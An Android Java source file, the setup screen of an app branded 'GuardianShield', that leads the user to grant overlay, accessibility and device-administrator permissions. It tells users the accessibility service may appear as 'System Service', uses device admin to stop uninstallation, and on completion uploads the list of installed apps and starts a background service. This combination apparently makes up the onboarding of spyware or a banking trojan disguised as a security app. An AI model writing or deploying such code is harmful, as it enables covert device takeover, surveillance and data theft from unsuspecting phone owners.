package com.guardianshield.agent;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.util.List;

public class SetupActivity extends Activity {

    private static final int REQ_DEVICE_ADMIN = 101;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        buildUI();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }

    private void updateStatus() {
        boolean overlay     = Settings.canDrawOverlays(this);
        boolean accessibility = isAccessibilityEnabled();
        if (tvStatus != null) {
            StringBuilder sb = new StringBuilder();
            sb.append(overlay       ? "✓ Overlay: Granted\n"          : "✗ Overlay: NOT granted\n");
            sb.append(accessibility ? "✓ Accessibility: Enabled\n"    : "✗ Accessibility: NOT enabled\n");
            tvStatus.setText(sb.toString().trim());
            tvStatus.setTextColor(overlay && accessibility ? Color.parseColor("#4ade80") : Color.parseColor("#f87171"));
        }
    }

    private boolean isAccessibilityEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
        if (am == null) return false;
        List<android.accessibilityservice.AccessibilityServiceInfo> services =
                am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (android.accessibilityservice.AccessibilityServiceInfo info : services) {
            if (info.getId().contains(getPackageName())) return true;
        }
        return false;
    }

    private void buildUI() {
        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(Color.parseColor("#0f0c29"));

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(60, 80, 60, 60);
        root.setGravity(Gravity.CENTER_HORIZONTAL);

        // Title
        TextView title = new TextView(this);
        title.setText("🛡 GuardianShield");
        title.setTextSize(28);
        title.setTextColor(Color.WHITE);
        title.setTypeface(null, Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("Setup required — grant permissions below");
        sub.setTextSize(14);
        sub.setTextColor(Color.parseColor("#aaaacc"));
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, 16, 0, 48);
        root.addView(sub);

        // Step 1 - Overlay
        root.addView(makeLabel("Step 1 of 3 — Display Over Other Apps"));
        Button btnOverlay = makeButton("GRANT OVERLAY PERMISSION", "#7C3AED");
        btnOverlay.setOnClickListener(v -> startActivity(new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()))));
        root.addView(btnOverlay);

        // Step 2 - Accessibility (NEW - replaces Usage Access)
        root.addView(makeLabel("Step 2 of 3 — Accessibility Service (REQUIRED)"));
        TextView accessNote = new TextView(this);
        accessNote.setText("⚠ This is the most important step!\nFind 'System Service' or 'GuardianShield' and enable it.");
        accessNote.setTextSize(12);
        accessNote.setTextColor(Color.parseColor("#fb923c"));
        accessNote.setPadding(0, 0, 0, 8);
        root.addView(accessNote);
        Button btnAccess = makeButton("ENABLE ACCESSIBILITY SERVICE", "#7C3AED");
        btnAccess.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        root.addView(btnAccess);

        // Step 3 - Device Admin
        root.addView(makeLabel("Step 3 of 3 — Device Administrator"));
        Button btnAdmin = makeButton("ACTIVATE DEVICE ADMIN", "#7C3AED");
        btnAdmin.setOnClickListener(v -> {
            ComponentName comp = new ComponentName(this, AdminReceiver.class);
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required to prevent unauthorized uninstallation.");
            startActivityForResult(i, REQ_DEVICE_ADMIN);
        });
        root.addView(btnAdmin);

        // Status
        tvStatus = new TextView(this);
        tvStatus.setTextSize(13);
        tvStatus.setGravity(Gravity.CENTER);
        tvStatus.setPadding(0, 24, 0, 0);
        root.addView(tvStatus);

        // Finish
        Button btnFinish = makeButton("✓ ALL DONE — START PROTECTION", "#22c55e");
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 140);
        lp.topMargin = 40;
        btnFinish.setLayoutParams(lp);
        btnFinish.setOnClickListener(v -> finishSetup());
        root.addView(btnFinish);

        scroll.addView(root);
        setContentView(scroll);
        updateStatus();
    }

    private void finishSetup() {
        getSharedPreferences("gs_prefs", MODE_PRIVATE)
                .edit().putBoolean("setup_done", true).apply();
        AppScanner.uploadInstalledApps(this);
        startService(new Intent(this, GuardService.class));
        tvStatus.setText("✓ GuardianShield is now active!");
        tvStatus.setTextColor(Color.parseColor("#4ade80"));
        tvStatus.postDelayed(this::finish, 1500);
    }

    private TextView makeLabel(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextColor(Color.parseColor("#a78bfa"));
        tv.setTextSize(13);
        tv.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 32;
        lp.bottomMargin = 8;
        tv.setLayoutParams(lp);
        return tv;
    }

    private Button makeButton(String text, String hex) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(14);
        btn.setTypeface(null, Typeface.BOLD);
        btn.setBackgroundColor(Color.parseColor(hex));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 130);
        lp.topMargin = 8;
        btn.setLayoutParams(lp);
        return btn;
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        if (req == REQ_DEVICE_ADMIN && res == RESULT_OK)
            updateStatus();
    }
}
